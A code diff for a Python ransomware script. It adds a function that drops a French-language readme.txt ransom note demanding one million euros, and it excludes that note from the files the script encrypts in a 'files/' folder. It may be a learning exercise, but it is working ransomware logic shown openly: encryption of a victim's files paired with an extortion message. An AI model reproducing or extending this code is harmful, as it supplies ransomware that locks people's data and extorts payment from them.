@@ -31,12 +31,18 @@ def encrypt(targets, key):
                 f.write(encrypted_content)
             print(f"{target} has been encrypted.")
 
+def request_for_ransom(target_folder_path):
+    with open(target_folder_path + "readme.txt", "wb") as f:
+        message = "Pour 1 000 000 euros, nous déchiffrons vos données!!"
+        f.write(message.encode())
 
 if __name__ == '__main__':
     if not os.path.exists("key.key"):
         generate_key()
 
+    target_folder_path = "files/"
     key = read_key()
-    targets = ["files/" + filename for filename in os.listdir("files")]
+    targets = [target_folder_path + filename for filename in os.listdir(target_folder_path) if filename != "readme.txt"]
 
     encrypt(targets, key)
+    request_for_ransom(target_folder_path)
